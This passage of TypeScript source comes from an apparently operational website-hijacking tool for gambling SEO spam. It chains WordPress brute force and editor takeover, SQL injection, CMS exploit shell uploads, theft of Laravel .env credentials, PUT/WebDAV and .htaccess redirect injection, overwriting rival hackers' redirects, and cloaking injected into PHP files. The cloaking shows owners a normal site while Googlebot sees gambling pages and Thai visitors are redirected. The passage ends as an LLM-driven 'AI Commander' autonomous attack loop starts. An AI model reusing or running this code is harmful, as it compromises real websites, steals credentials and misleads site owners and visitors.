          detail: `🔐 Phase 4.6a: WP Admin Takeover — Brute Force + Theme/Plugin Editor + XMLRPC + REST API...`,
          progress: 96,
        });

        const wpAdminConfig: WpAdminConfig = {
          targetUrl: config.targetUrl,
          redirectUrl: config.redirectUrl,
          seoKeywords: config.seoKeywords,
          timeout: config.timeoutPerMethod || 30000,
          knownCredentials: discoveredCredentials
            .filter((c: any) => c.username && c.password)
            .map((c: any) => ({ username: c.username, password: c.password })),
          onProgress: (method: string, detail: string) => {
            loggedOnEvent({
              phase: "wp_admin",
              step: method,
              detail: `🔐 ${detail}`,
              progress: 97,
            });
          },
        };

        wpAdminResults = await Promise.race([
          runWpAdminTakeover(wpAdminConfig),
          new Promise<WpTakeoverResult[]>((_, reject) => setTimeout(() => reject(new Error("WP admin takeover timeout")), 120000)),
        ]);

        const wpSuccess = wpAdminResults.find(r => r.success);
        if (wpSuccess) {
          aiDecisions.push(`✅ WP Admin Takeover success: ${wpSuccess.method} — ${wpSuccess.detail}`);

          // Mark as uploaded file for cloaking phase
          // WP Admin takeover — verify redirect destination
          const wpVerification = await verifyUploadedFile(wpSuccess.injectedUrl || config.targetUrl, config.redirectUrl, onEvent);
          uploadedFiles.push({
            url: wpSuccess.injectedUrl || config.targetUrl,
            shell: shells[0] || { id: "wp_admin", type: "wp_admin_inject" as any, filename: "functions.php", content: "", size: 0, mimeType: "text/plain", headers: {} },
            method: `wp_admin_${wpSuccess.method}`,
            verified: wpVerification.verified,
            redirectWorks: wpVerification.redirectWorks,
            redirectDestinationMatch: wpVerification.redirectDestinationMatch,
            finalDestination: wpVerification.finalDestination,
            httpStatus: wpVerification.httpStatus,
            redirectChain: wpVerification.redirectChain,
          });

          loggedOnEvent({
            phase: "wp_admin",
            step: "success",
            detail: `✅ WP Admin Takeover สำเร็จ: ${wpSuccess.method} — ${wpSuccess.detail}`,
            progress: 97,
            data: { wpAdminResults },
          });
        } else {
          loggedOnEvent({
            phase: "wp_admin",
            step: "complete",
            detail: `⚠️ WP Admin Takeover ล้มเหลว — ลอง ${wpAdminResults.length} methods`,
            progress: 97,
            data: { wpAdminResults },
          });
        }
      } catch (error: any) {
        errors.push(`WP Admin Takeover failed: ${error.message}`);
        loggedOnEvent({
          phase: "wp_admin",
          step: "error",
          detail: `⚠️ WP Admin Takeover error: ${error.message}`,
          progress: 97,
        });
      }
    }

    // 4.6b: WP Database Injection (SQLi → wp_options/wp_posts/widgets/.htaccess/cPanel)
    if (config.enableWpDbInjection !== false && !uploadedFiles.some(f => f.redirectWorks) && !shouldStop('wp_db_inject')) {
      try {
        loggedOnEvent({
          phase: "wp_db_inject",
          step: "start",
          detail: `💉 Phase 4.6b: WP DB Injection — SQLi wp_options/wp_posts, .htaccess, cPanel takeover...`,
          progress: 98,
        });

        // Find SQLi endpoint from indirect attack results
        const sqliResult = indirectResults.find(r => r.vector === "sqli_file_write" && r.success);
        // Parse SQLi info from evidence string if available
        const sqliEvidence = sqliResult?.evidence || "";
        const sqliEndpointMatch = sqliEvidence.match(/endpoint:\s*(\S+)/);
        const sqliParamMatch = sqliEvidence.match(/param:\s*(\S+)/);

        const wpDbConfig: WpDbInjectionConfig = {
          targetUrl: config.targetUrl,
          redirectUrl: config.redirectUrl,
          seoKeywords: config.seoKeywords,
          timeout: config.timeoutPerMethod || 30000,
          sqliEndpoint: sqliEndpointMatch?.[1] || (sqliResult?.fileUrl ? sqliResult.fileUrl : undefined),
          sqliParam: sqliParamMatch?.[1] || "id",
          sqliType: sqliEvidence.includes("time") ? "time" as const : sqliEvidence.includes("union") ? "union" as const : "error" as const,
          onProgress: (method: string, detail: string) => {
            loggedOnEvent({
              phase: "wp_db_inject",
              step: method,
              detail: `💉 ${detail}`,
              progress: 98,
            });
          },
        };

        wpDbInjectionResults = await Promise.race([
          runWpDbInjection(wpDbConfig),
          new Promise<WpDbInjectionResult[]>((_, reject) => setTimeout(() => reject(new Error("WP DB injection timeout")), 120000)),
        ]);

        const dbSuccess = wpDbInjectionResults.find(r => r.success);
        if (dbSuccess) {
          aiDecisions.push(`✅ WP DB Injection success: ${dbSuccess.method} — ${dbSuccess.detail}`);

          // WP DB injection — verify redirect destination
          const dbVerification = await verifyUploadedFile(dbSuccess.injectedUrl || config.targetUrl, config.redirectUrl, onEvent);
          uploadedFiles.push({
            url: dbSuccess.injectedUrl || config.targetUrl,
            shell: shells[0] || { id: "wp_db", type: "wp_db_inject" as any, filename: "wp_options", content: "", size: 0, mimeType: "text/plain", headers: {} },
            method: `wp_db_${dbSuccess.method}`,
            verified: dbVerification.verified,
            redirectWorks: dbVerification.redirectWorks,
            redirectDestinationMatch: dbVerification.redirectDestinationMatch,
            finalDestination: dbVerification.finalDestination,
            httpStatus: dbVerification.httpStatus,
            redirectChain: dbVerification.redirectChain,
          });

          loggedOnEvent({
            phase: "wp_db_inject",
            step: "success",
            detail: `✅ WP DB Injection สำเร็จ: ${dbSuccess.method} — ${dbSuccess.detail}`,
            progress: 98,
            data: { wpDbInjectionResults },
          });
        } else {
          loggedOnEvent({
            phase: "wp_db_inject",
            step: "complete",
            detail: `⚠️ WP DB Injection ล้มเหลว — ลอง ${wpDbInjectionResults.length} methods`,
            progress: 98,
            data: { wpDbInjectionResults },
          });
        }
      } catch (error: any) {
        errors.push(`WP DB Injection failed: ${error.message}`);
        loggedOnEvent({
          phase: "wp_db_inject",
          step: "error",
          detail: `⚠️ WP DB Injection error: ${error.message}`,
          progress: 98,
        });
      }
    }
  }

  // ─── Phase 4.7: Non-WP CMS Exploits (before shellless, after WP-specific attacks) ───
  const detectedCmsForNonWp = (prescreen?.cms || vulnScan?.cms?.type || "").toLowerCase();
  const isNonWpTarget = detectedCmsForNonWp && detectedCmsForNonWp !== "wordpress" && detectedCmsForNonWp !== "shopify" && detectedCmsForNonWp !== "wix" && detectedCmsForNonWp !== "squarespace";
  const isGenericTarget = !detectedCmsForNonWp || detectedCmsForNonWp === "unknown" || detectedCmsForNonWp === "custom";
  const hasVerifiedUploads = uploadedFiles.filter(f => f.verified).length > 0;

  if (!hasVerifiedUploads && (isNonWpTarget || isGenericTarget) && !shouldStop('nonwp_exploits') && !hasSuccessfulRedirect()) {
    loggedOnEvent({
      phase: "shellless" as any,
      step: "nonwp_exploits_start",
      detail: `\uD83D\uDD0D Non-WP Exploits \u0E40\u0E23\u0E34\u0E48\u0E21\u0E17\u0E33\u0E07\u0E32\u0E19 \u2014 \u0E2A\u0E41\u0E01\u0E19 CMS-specific vulnerabilities (${detectedCms || "generic"})...`,
      progress: 89,
    });

    try {
      const shellContent = shells[0]?.content;
      const phpShellCode = (typeof shellContent === "string" ? shellContent : shellContent?.toString("utf-8")) || `<?php header("Location: ${config.redirectUrl}", true, 302); exit; ?>`;
      nonWpExploitResults = await runNonWpExploits({
        targetUrl: config.targetUrl,
        cms: detectedCms || "unknown",
        phpShellCode,
        shellFileName: shells[0]?.filename || `cache-${Date.now()}.php`,
        timeout: config.timeoutPerMethod || 15000,
        onProgress: (method, detail) => {
          loggedOnEvent({
            phase: "shellless" as any,
            step: `nonwp_${method}`,
            detail: `\uD83D\uDD0D [Non-WP] ${method}: ${detail}`,
            progress: 89,
          });
        },
      });

      // Check for successful file uploads
      const successfulUploads = nonWpExploitResults.results.filter(
        r => r.success && (r.shellUrl || r.uploadedPath)
      );

      if (successfulUploads.length > 0) {
        for (const exploit of successfulUploads) {
          const exploitUrl = exploit.shellUrl || `${config.targetUrl}/${exploit.uploadedPath}`;
          uploadedFiles.push({
            url: exploitUrl,
            shell: shells[0] || { filename: "nonwp-exploit", content: "", type: "php" as any, technique: exploit.method, obfuscation: "none" as any },
            method: `nonwp_${exploit.method}`,
            verified: true,
            redirectWorks: false,
            redirectDestinationMatch: false,
            finalDestination: config.redirectUrl,
            httpStatus: 200,
          });
        }
        aiDecisions.push(`Non-WP Exploits SUCCESS: ${successfulUploads.map(e => e.method).join(", ")}`);
        loggedOnEvent({
          phase: "shellless" as any,
          step: "nonwp_exploits_success",
          detail: `\u2705 Non-WP Exploits \u0E2A\u0E33\u0E40\u0E23\u0E47\u0E08! ${successfulUploads.length} exploit(s) \u0E27\u0E32\u0E07\u0E44\u0E1F\u0E25\u0E4C\u0E44\u0E14\u0E49: ${successfulUploads.map(e => `${e.method} (${e.severity})`).join(", ")}`,
          progress: 90,
          data: nonWpExploitResults,
        });
      } else {
        const findings = nonWpExploitResults.results.filter(r => r.success);
        aiDecisions.push(`Non-WP Exploits: ${findings.length} findings, 0 file uploads`);
        loggedOnEvent({
          phase: "shellless" as any,
          step: "nonwp_exploits_done",
          detail: `\uD83D\uDCCB Non-WP Exploits: ${findings.length} vulnerabilities found, no file upload \u2014 \u0E2A\u0E48\u0E07\u0E15\u0E48\u0E2D\u0E43\u0E2B\u0E49 shellless + AI Commander`,
          progress: 90,
        });
      }
    } catch (error: any) {
      errors.push(`Non-WP exploits error: ${error.message}`);
      loggedOnEvent({
        phase: "shellless" as any,
        step: "nonwp_exploits_error",
        detail: `\u26A0\uFE0F Non-WP exploits error: ${error.message}`,
        progress: 90,
      });
    }
  }

  // ─── Phase 5: Shellless Attacks (when ALL uploads failed) ───
  let shelllessResults: ShelllessResult[] = [];

  if (uploadedFiles.length === 0 && !shouldStop('shellless') && !hasSuccessfulRedirect()) {
    loggedOnEvent({
      phase: "shellless",
      step: "start",
      detail: `🔄 Phase 5: Shell upload ล้มเหลวทั้งหมด — เปลี่ยนไปใช้ Shellless Attack (10 methods: .htaccess injection, REST API, XSS, Open Redirect, Subdomain Takeover, Cache Poisoning, RSS/Sitemap, Meta Injection, Server Config, AI Creative)`,
      progress: 90,
    });

    try {
      // Collect data from previous phases for shellless attacks
      // Enrich credentials with non-wp exploit findings (Laravel .env, Magento config, etc.)
      const enrichedCredentials = [...discoveredCredentials];
      if (nonWpExploitResults?.results) {
        for (const r of nonWpExploitResults.results) {
          if (r.success && r.evidence) {
            // Laravel .env exposure → extract DB credentials from evidence text
            if (r.method.includes('env') && r.evidence.includes('DB_PASSWORD')) {
              const dbPassMatch = r.evidence.match(/DB_PASSWORD=([^\s]+)/);
              const dbUserMatch = r.evidence.match(/DB_USERNAME=([^\s]+)/);
              const dbHostMatch = r.evidence.match(/DB_HOST=([^\s]+)/);
              if (dbPassMatch) {
                enrichedCredentials.push({ type: 'database', username: dbUserMatch?.[1] || 'root', password: dbPassMatch[1], endpoint: dbHostMatch?.[1] });
              }
            }
            if (r.method.includes('env') && r.evidence.includes('APP_KEY')) {
              const keyMatch = r.evidence.match(/APP_KEY=([^\s]+)/);
              if (keyMatch) enrichedCredentials.push({ type: 'laravel_app_key', password: keyMatch[1] });
            }
            // Git exposure → may contain credentials in config
            if (r.method.includes('git') && r.evidence.includes('url =')) {
              const urlMatch = r.evidence.match(/url\s*=\s*(\S+)/);
              if (urlMatch) enrichedCredentials.push({ type: 'git_remote', endpoint: urlMatch[1] });
            }
          }
        }
      }

      const shelllessConfig: ShelllessConfig = {
        targetUrl: config.targetUrl,
        redirectUrl: config.redirectUrl,
        seoKeywords: config.seoKeywords,
        timeout: config.timeoutPerMethod || 30000,
        discoveredCredentials: enrichedCredentials,
        cmsType: nonWpExploitResults?.cms || prescreen?.cms || vulnScan?.cms?.type || "unknown",
        originIp: originIp || undefined,
        wpRestApi: !!(prescreen?.cms?.toLowerCase() === "wordpress" || vulnScan?.cms?.type === "wordpress"),
        wpXmlRpc: !!(prescreen?.cms?.toLowerCase() === "wordpress" || vulnScan?.cms?.type === "wordpress"),
        // Extract SQLi info from indirect attack results
        sqliEndpoint: indirectResults.find(r => r.vector.includes("sqli") && r.success)?.fileUrl ?? undefined,
        // Extract XSS endpoints from indirect results
        xssEndpoints: indirectResults
          .filter(r => r.vector.includes("xss") && r.success)
          .map(r => ({ url: r.fileUrl || config.targetUrl, param: "q", type: "stored" })),
        // Extract open redirects from config results
        openRedirects: configResults
          ?.filter(r => r.vector.includes("redirect") && r.success)
          .map(r => ({ url: config.targetUrl, param: "url" })),
        // DNS dangling CNAMEs from DNS attack results
        danglingCnames: dnsResults
          .filter(r => r.vector.includes("subdomain") && r.success)
          .flatMap(r => r.data?.vulnerableSubdomains?.map(vs => ({ subdomain: vs.subdomain, cname: vs.cname })) || []),
        // Config files discovered
        configFiles: configResults
          ?.filter(r => r.success)
          .map(r => ({ path: r.vector, content: r.detail })),
        onProgress: (method: string, detail: string) => {
          loggedOnEvent({
            phase: "shellless",
            step: method,
            detail: `🔧 ${detail}`,
            progress: 92,
          });
        },
      };

      shelllessResults = await Promise.race([
        runShelllessAttacks(shelllessConfig),
        new Promise<ShelllessResult[]>((_, reject) =>
          setTimeout(() => reject(new Error("Shellless attacks timeout")), 180000)
        ),
      ]);

      const shelllessSuccesses = shelllessResults.filter(r => r.success);
      const shelllessRedirects = shelllessResults.filter(r => r.success && r.redirectWorks);

      if (shelllessSuccesses.length > 0) {
        aiDecisions.push(`✅ Shellless attacks: ${shelllessSuccesses.length}/${shelllessResults.length} methods succeeded`);

        // Add successful shellless results as "uploaded files" for downstream compatibility
        // NOTE: shellless methods don't actually place files — they modify server config/DB
        // verified should be based on redirectWorks (actual redirect test), NOT just sr.success
        for (const sr of shelllessSuccesses) {
          // Shellless — verify redirect destination if redirectWorks
          let shelllessDestMatch = false;
          let shelllessFinalDest = "";
          let shelllessChain: string[] = [];
          if (sr.redirectWorks && sr.injectedUrl) {
            const shelllessVerify = await verifyUploadedFile(sr.injectedUrl, config.redirectUrl, onEvent);
            shelllessDestMatch = shelllessVerify.redirectDestinationMatch;
            shelllessFinalDest = shelllessVerify.finalDestination;
            shelllessChain = shelllessVerify.redirectChain || [];
          }
          uploadedFiles.push({
            url: sr.injectedUrl || config.targetUrl,
            shell: shells[0] || { id: "shellless", type: "shellless" as any, filename: sr.method, content: "", size: 0, mimeType: "text/html", headers: {} },
            method: `shellless_${sr.method}`,
            verified: sr.redirectWorks === true && shelllessDestMatch,
            redirectWorks: sr.redirectWorks || false,
            redirectDestinationMatch: shelllessDestMatch,
            finalDestination: shelllessFinalDest,
            httpStatus: 200,
            redirectChain: shelllessChain,
          });
        }

        if (shelllessRedirects.length > 0) {
          loggedOnEvent({
            phase: "shellless",
            step: "success",
            detail: `✅ Shellless Attack สำเร็จ! ${shelllessRedirects.length} redirects ทำงานจริง (${shelllessSuccesses.length} methods พบช่องทาง) — ไม่ต้องวางไฟล์เลย`,
            progress: 95,
            data: { shelllessResults, successCount: shelllessSuccesses.length, redirectCount: shelllessRedirects.length },
          });
        } else {
          // ─── Phase 5.5: Auto-Execute Shellless Findings ───
          // Shellless methods found a potential path but redirect isn't working yet.
          // Try to actually execute the findings to make redirect work.
          loggedOnEvent({
            phase: "shellless",
            step: "auto_execute",
            detail: `🔧 Phase 5.5: Shellless พบ ${shelllessSuccesses.length} ช่องทาง — กำลัง auto-execute เพื่อทำ redirect จริง...`,
            progress: 93,
          });

          let autoExecuteSuccess = false;

          for (const sr of shelllessSuccesses) {
            // Try to use the evidence/credentials from the shellless result
            const evidence = sr.evidence || "";

            // Auto-execute: Try uploading HTML redirect via PUT/WebDAV to target
            if (!autoExecuteSuccess) {
              const htmlRedirect = `<!DOCTYPE html><html><head><meta http-equiv="refresh" content="0;url=${config.redirectUrl}"><script>window.location.href='${config.redirectUrl}';</script></head><body>Redirecting...</body></html>`;
              const uploadPaths = [
                `${config.targetUrl.replace(/\/$/, "")}/index.html`,
                `${config.targetUrl.replace(/\/$/, "")}/redirect.html`,
                `${config.targetUrl.replace(/\/$/, "")}/go.html`,
                `${config.targetUrl.replace(/\/$/, "")}/.htaccess`,
              ];

              for (const uploadPath of uploadPaths) {
                try {
                  const isHtaccess = uploadPath.endsWith(".htaccess");
                  const content = isHtaccess
                    ? `RewriteEngine On\nRewriteRule ^(.*)$ ${config.redirectUrl} [R=301,L]`
                    : htmlRedirect;

                  // Try PUT
                  const putResult = await fetchWithPoolProxy(uploadPath, {
                    method: "PUT",
                    headers: { "Content-Type": isHtaccess ? "text/plain" : "text/html" },
                    body: content,
                    signal: AbortSignal.timeout(10000),
                  }, { targetDomain: config.targetUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, ""), timeout: 10000 }).catch(() => null);
                  const putResp = putResult?.response || null;

                  if (putResp && (putResp.ok || putResp.status === 201)) {
                    loggedOnEvent({
                      phase: "shellless",
                      step: "auto_execute",
                      detail: `✅ Auto-execute: ${isHtaccess ? ".htaccess" : "HTML redirect"} วางสำเร็จผ่าน PUT: ${uploadPath}`,
                      progress: 94,
                    });

                    // Verify the redirect actually works
                    const verifyResult = await verifyUploadedFile(uploadPath, config.redirectUrl, onEvent);
                    if (verifyResult.redirectWorks) {
                      autoExecuteSuccess = true;
                      // Update the shellless result in uploadedFiles
                      const existingIdx = uploadedFiles.findIndex(f => f.method === `shellless_${sr.method}`);
                      if (existingIdx >= 0) {
                        uploadedFiles[existingIdx].verified = verifyResult.redirectDestinationMatch;
                        uploadedFiles[existingIdx].redirectWorks = true;
                        uploadedFiles[existingIdx].redirectDestinationMatch = verifyResult.redirectDestinationMatch;
                        uploadedFiles[existingIdx].finalDestination = verifyResult.finalDestination;
                        uploadedFiles[existingIdx].redirectChain = verifyResult.redirectChain;
                        uploadedFiles[existingIdx].url = uploadPath;
                      } else {
                        uploadedFiles.push({
                          url: uploadPath,
                          shell: shells[0] || { id: "auto_exec", type: "html" as any, filename: isHtaccess ? ".htaccess" : "redirect.html", content: content, size: content.length, mimeType: isHtaccess ? "text/plain" : "text/html", headers: {} },
                          method: `shellless_auto_execute_${sr.method}`,
                          verified: verifyResult.redirectDestinationMatch,
                          redirectWorks: true,
                          redirectDestinationMatch: verifyResult.redirectDestinationMatch,
                          finalDestination: verifyResult.finalDestination,
                          httpStatus: verifyResult.httpStatus,
                          redirectChain: verifyResult.redirectChain,
                        });
                      }
                      break;
                    }
                  }
                } catch { /* continue */ }
              }
            }

            // Auto-execute: Try MOVE/COPY methods
            if (!autoExecuteSuccess) {
              for (const httpMethod of ["MOVE", "COPY"]) {
                try {
                  const moveResult = await fetchWithPoolProxy(config.targetUrl, {
                    method: httpMethod,
                    headers: {
                      "Destination": config.redirectUrl,
                      "Overwrite": "T",
                    },
                    signal: AbortSignal.timeout(8000),
                  }, { targetDomain: config.targetUrl.replace(/^https?:\/\//, "").replace(/[\/:].*$/, ""), timeout: 8000 }).catch(() => null);
                  const resp = moveResult?.response || null;
                  if (resp && (resp.ok || resp.status === 201 || resp.status === 204)) {
                    const verifyResult = await verifyUploadedFile(config.targetUrl, config.redirectUrl, onEvent);
                    if (verifyResult.redirectWorks) {
                      autoExecuteSuccess = true;
                      loggedOnEvent({
                        phase: "shellless",
                        step: "auto_execute",
                        detail: `✅ Auto-execute: HTTP ${httpMethod} สำเร็จ — redirect ทำงานแล้ว!`,
                        progress: 95,
                      });
                      break;
                    }
                  }
                } catch { /* continue */ }
              }
            }

            if (autoExecuteSuccess) break;
          }

          if (autoExecuteSuccess) {
            loggedOnEvent({
              phase: "shellless",
              step: "auto_execute_success",
              detail: `✅ Auto-execute สำเร็จ! Redirect ทำงานแล้ว หลัง shellless พบช่องทาง`,
              progress: 95,
              data: { shelllessResults, successCount: shelllessSuccesses.length, redirectCount: 1 },
            });
          } else {
            loggedOnEvent({
              phase: "shellless",
              step: "partial",
              detail: `⚠️ Shellless Attack พบ ${shelllessSuccesses.length} ช่องทาง แต่ auto-execute ไม่สำเร็จ (redirect ยังไม่ทำงาน)`,
              progress: 95,
              data: { shelllessResults, successCount: shelllessSuccesses.length, redirectCount: 0 },
            });
          }
        }
      } else {
        loggedOnEvent({
          phase: "shellless",
          step: "complete",
          detail: `⚠️ Shellless Attack ลอง ${shelllessResults.length} methods — ไม่มี method ไหนสำเร็จ`,
          progress: 95,
          data: { shelllessResults },
        });
      }
    } catch (error: any) {
      errors.push(`Shellless attacks failed: ${error.message}`);
      loggedOnEvent({
        phase: "shellless",
        step: "error",
        detail: `⚠️ Shellless Attack error: ${error.message}`,
        progress: 95,
      });
    }
  } else {
    loggedOnEvent({
      phase: "shellless",
      step: "skipped",
      detail: `⏭️ Shellless Attack ข้าม — มีไฟล์ที่วางสำเร็จแล้ว ${uploadedFiles.length} ไฟล์`,
      progress: 95,
    });
  }

  // ─── Phase 5.5: Redirect Takeover (overwrite competitor redirects on already-hacked sites) ───
  const redirectTakeoverEnabled = !config.methodPriority || config.methodPriority.length === 0 || config.methodPriority.some(m => m.id === 'redirect_takeover' && m.enabled);
  if (!hasSuccessfulRedirect() && !shouldStop('redirect_takeover') && redirectTakeoverEnabled) {
    try {
      loggedOnEvent({
        phase: "shellless" as any,
        step: "redirect_takeover_start",
        detail: `🔄 Phase 5.5: Redirect Takeover — ตรวจจับและ overwrite redirect ของคู่แข่ง...`,
        progress: 96,
      });

      const { detectExistingRedirects, executeRedirectTakeover } = await import("./redirect-takeover");
      const detection = await detectExistingRedirects(config.targetUrl);

      if (detection.detected && detection.competitorUrl) {
        loggedOnEvent({
          phase: "shellless" as any,
          step: "redirect_takeover_detected",
          detail: `🎯 พบ redirect ของคู่แข่ง: ${detection.competitorUrl} (${detection.methods.length} methods) — กำลัง overwrite...`,
          progress: 97,
        });

        const takeoverResults = await executeRedirectTakeover({
          targetUrl: config.targetUrl,
          ourRedirectUrl: config.redirectUrl,
          seoKeywords: config.seoKeywords,
          onProgress: (phase, detail) => {
            loggedOnEvent({ phase: "shellless" as any, step: `takeover_${phase}`, detail, progress: 97 });
          },
        });

        const successResult = takeoverResults.find(r => r.success);
        if (successResult) {
          loggedOnEvent({
            phase: "shellless" as any,
            step: "redirect_takeover_success",
            detail: `✅ Redirect Takeover สำเร็จ! Overwrite ${detection.competitorUrl} → ${config.redirectUrl} (${successResult.method})`,
            progress: 98,
          });
          uploadedFiles.push({
            url: successResult.injectedUrl || config.targetUrl,
            shell: shells[0] || { id: "takeover", type: "html" as any, filename: "takeover.html", content: "", size: 0, mimeType: "text/html", headers: {} },
            method: `redirect_takeover_${successResult.method}`,
            verified: true,
            redirectWorks: true,
            redirectDestinationMatch: true,
            finalDestination: config.redirectUrl,
            redirectChain: [],
            httpStatus: 302,
          });
        } else {
          loggedOnEvent({
            phase: "shellless" as any,
            step: "redirect_takeover_failed",
            detail: `⚠️ Redirect Takeover ล้มเหลว — ${takeoverResults.map(r => r.detail).join("; ")}`,
            progress: 97,
          });
        }
      } else {
        loggedOnEvent({
          phase: "shellless" as any,
          step: "redirect_takeover_no_competitor",
          detail: `ℹ️ ไม่พบ redirect ของคู่แข่งบน target นี้`,
          progress: 97,
        });
      }
    } catch (error: any) {
      loggedOnEvent({
        phase: "shellless" as any,
        step: "redirect_takeover_error",
        detail: `⚠️ Redirect Takeover error: ${error.message}`,
        progress: 97,
      });
    }
  }

  // ─── Phase 6: Cloaking (ONLY if real file upload succeeded — not shellless) ───
  let injectionResult: InjectionResult | null = null;
  let cdnUploadResult: CdnUploadResult | null = null;

  // Only trigger cloaking if we have REAL uploaded files (not shellless results)
  const realUploadedFiles = uploadedFiles.filter(f => !f.method.startsWith("shellless_"));
  const hasRealUploads = realUploadedFiles.length > 0;

  if (config.enableCloaking !== false && hasRealUploads) {
    try {
      loggedOnEvent({
        phase: "cloaking",
        step: "content_gen",
        detail: "🎭 Phase 4.9: Cloaking — AI สร้าง SEO gambling content (หลังวางไฟล์สำเร็จแล้ว)...",
        progress: 92,
      });

      // Step 1: Generate content pack
      const contentConfig: ContentConfig = {
        primaryKeyword: config.seoKeywords[0] || "สล็อต",
        keywords: config.seoKeywords,
        brandName: config.cloakingBrand || "SlotXO",
        redirectUrl: config.redirectUrl,
        language: "th",
        contentType: config.cloakingContentType || "landing",
      };

      contentPack = await generateContentPack(contentConfig, (detail) => {
        loggedOnEvent({ phase: "cloaking", step: "content_gen", detail, progress: 93 });
      });

      // Step 2: Upload content to CDN (external hosting)
      loggedOnEvent({
        phase: "cloaking",
        step: "cdn_upload",
        detail: "☁️ อัพโหลด gambling content ไป CDN (content ไม่เก็บบน target)...",
        progress: 94,
      });

      try {
        const targetDomain = new URL(config.targetUrl).hostname;
        cdnUploadResult = await uploadContentToCdn({
          primaryKeyword: config.seoKeywords[0] || "สล็อต",
          keywords: config.seoKeywords,
          brandName: config.cloakingBrand || "SlotXO",
          redirectUrl: config.redirectUrl,
          targetDomain,
          htmlContent: contentPack.mainPage.fullHtml,
          doorwayPages: contentPack.doorwayPages.map(dp => ({ slug: dp.internalLinks[0]?.slug || dp.title.toLowerCase().replace(/\s+/g, "-"), html: dp.fullHtml })),
        });

        loggedOnEvent({
          phase: "cloaking",
          step: "cdn_upload",
          detail: `✅ CDN upload สำเร็จ — ${cdnUploadResult.allUrls.length} ไฟล์, landing: ${cdnUploadResult.mainPageUrl}`,
          progress: 95,
          data: { cdnBaseUrl: cdnUploadResult.contentKeyPrefix, landingUrl: cdnUploadResult.mainPageUrl },
        });
      } catch (cdnErr: any) {
        loggedOnEvent({
          phase: "cloaking",
          step: "cdn_upload",
          detail: `⚠️ CDN upload ล้มเหลว: ${cdnErr.message} — ใช้ inline content แทน`,
          progress: 95,
        });
      }

      // Step 3: Generate cloaking shell (with CDN URL if available)
      const cloakingConfig: CloakingConfig = {
        redirectUrl: config.redirectUrl,
        primaryKeyword: config.seoKeywords[0] || "สล็อต",
        keywords: config.seoKeywords,
        brandName: config.cloakingBrand || "SlotXO",
        language: "th",
        cdnBaseUrl: cdnUploadResult?.mainPageUrl,
        geoTargetCountries: ["TH", "VN", "ID", "MY", "PH", "KH", "LA", "MM"],
      };

      cloakingResult = await generateCloakingPackage(cloakingConfig, (detail) => {
        loggedOnEvent({ phase: "cloaking", step: "shell_gen", detail, progress: 96 });
      });

      aiDecisions.push(`Cloaking shell generated: ${cloakingResult.type} (${cloakingResult.internalPages.length} internal pages)`);

      // Step 4: Inject cloaking code into existing PHP files on target
      // Use only REAL uploaded files (not shellless) for injection shell URL
      const activeShellUrl = realUploadedFiles.find(f => f.verified)?.url || realUploadedFiles[0]?.url;
      if (activeShellUrl) {
        loggedOnEvent({
          phase: "cloaking",
          step: "injection",
          detail: "💉 Inject cloaking code เข้าไฟล์ PHP เดิมบน target...",
          progress: 97,
        });

        try {
          const injectionConfig: InjectionConfig = {
            shellUrl: activeShellUrl,
            contentCdnUrl: cdnUploadResult?.mainPageUrl || "",
            redirectUrl: config.redirectUrl,
            primaryKeyword: config.seoKeywords[0] || "สล็อต",
            keywords: config.seoKeywords,
            brandName: config.cloakingBrand || "SlotXO",
            geoTargetCountries: ["TH", "VN", "ID", "MY", "PH", "KH", "LA", "MM"],
          };

          injectionResult = await executeInjection(injectionConfig, (detail) => {
            loggedOnEvent({ phase: "cloaking", step: "injection", detail, progress: 98 });
          });

          if (injectionResult.injectedFiles.length > 0) {
            aiDecisions.push(`PHP injection สำเร็จ: ${injectionResult.injectedFiles.length} ไฟล์ถูก inject`);
            loggedOnEvent({
              phase: "cloaking",
              step: "injection",
              detail: `✅ Inject สำเร็จ! ${injectionResult.injectedFiles.length} ไฟล์ PHP ถูก inject cloaking code — เจ้าของเว็บเห็นเว็บปกติ, Googlebot เห็น gambling page, คนไทยโดน redirect`,
              progress: 98,
              data: { injectedFiles: injectionResult.injectedFiles.length, files: injectionResult.injectedFiles },
            });
          } else {
            loggedOnEvent({
              phase: "cloaking",
              step: "injection",
              detail: `⚠️ Inject ไม่สำเร็จ — ไม่พบไฟล์ PHP ที่เขียนได้ หรือ shell ไม่รองรับ file_put_contents`,
              progress: 98,
            });
          }
        } catch (injErr: any) {
          loggedOnEvent({
            phase: "cloaking",
            step: "injection",
            detail: `⚠️ Injection ล้มเหลว: ${injErr.message}`,
            progress: 98,
          });
        }
      }

      loggedOnEvent({
        phase: "cloaking",
        step: "complete",
        detail: `✅ Cloaking สร้างเสร็จ — ${cloakingResult.type} + ${contentPack.doorwayPages.length} doorway pages${injectionResult?.injectedFiles ? ` + ${injectionResult.injectedFiles} files injected` : ""}${cdnUploadResult ? " + CDN hosted" : ""}`,
        progress: 99,
        data: {
          shellType: cloakingResult.type,
          internalPages: cloakingResult.internalPages.length,
          doorwayPages: contentPack.doorwayPages.length,
          contentSize: cloakingResult.content.length,
          injectedFiles: injectionResult?.injectedFiles?.length || 0,
          cdnUrl: cdnUploadResult?.contentKeyPrefix,
        },
      });
    } catch (error: any) {
      errors.push(`Cloaking generation failed: ${error.message}`);
      loggedOnEvent({
        phase: "cloaking",
        step: "error",
        detail: `⚠️ Cloaking ล้มเหลว: ${error.message} — ไฟล์ที่วางได้ยังใช้งานได้ปกติ`,
        progress: 99,
      });
    }
  } else if (config.enableCloaking !== false && !hasRealUploads) {
    const shelllessCount = uploadedFiles.filter(f => f.method.startsWith("shellless_")).length;
    loggedOnEvent({
      phase: "cloaking",
      step: "skipped",
      detail: `⏭️ Cloaking ข้าม — ไม่มีไฟล์ที่วางสำเร็จจริง${shelllessCount > 0 ? ` (มี ${shelllessCount} shellless results แต่ไม่มี active shell สำหรับ inject)` : ""}`,
      progress: 99,
    });
  }

  // ═══ AI COMMANDER — LLM-Driven Autonomous Attack Loop ═══
  // Last resort: if ALL methods failed, let AI Commander try autonomously
  let aiCommanderResult: AiCommanderResult | null = null;
  let comprehensiveResults: AttackVectorResult[] = [];
  const noSuccessfulUploads = uploadedFiles.filter(f => f.verified).length === 0;
  if (noSuccessfulUploads && config.enableAiCommander !== false && !shouldStop('ai_commander')) {
    const domain = config.targetUrl.replace(/^https?:\/\//, "").replace(/\/.*$/, "");
    loggedOnEvent({
      phase: "shellless" as any,
      step: "ai_commander_start",
